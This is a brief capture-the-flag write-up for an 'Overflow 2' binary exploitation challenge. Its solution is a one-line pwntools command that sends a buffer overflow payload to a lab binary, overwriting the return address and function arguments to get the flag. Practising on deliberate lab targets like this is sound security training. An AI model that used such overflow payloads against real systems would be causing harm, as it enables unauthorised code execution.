# Overflow 2 

## Summary

Now try overwriting arguments. Can you get the flag from this program? You can find it in /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc on the shell server. Source.

## Solution

```sh
cd /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc; python2 -c "from pwn import *; print '\x90'*188 + p32(0x80485e6) + 'A'*4 + p32(0xDEADBEEF) + p32(0xC0DED00D)" | ./vuln;echo
```
